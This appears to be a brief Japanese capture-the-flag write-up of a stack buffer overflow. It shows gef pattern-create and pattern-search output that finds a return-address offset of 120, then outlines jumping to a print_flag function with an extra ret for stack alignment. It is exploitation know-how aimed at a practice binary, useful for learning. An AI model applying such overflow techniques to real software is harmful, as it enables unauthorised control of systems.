`-1`を入力するとメールアドレスの入力を求められる。
配列の長さは112。
![](https://i.gyazo.com/bc3252c53224ae7e15f0032b36895bfa.png)

```
gef➤  pattern create 150                 
[+] Generating a pattern of 150 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa   
```

`-1`を入力した後に↑を入力して、

```
gef➤  pattern search $rsp
[+] Searching for '7061616161616161'/'6161616161616170' with period=8
[+] Found at offset 120 (little-endian search) likely
```

オフセットは120。あとは`print_flag`すればいい。スタックアラインメントがずれるので`ret`を挟む。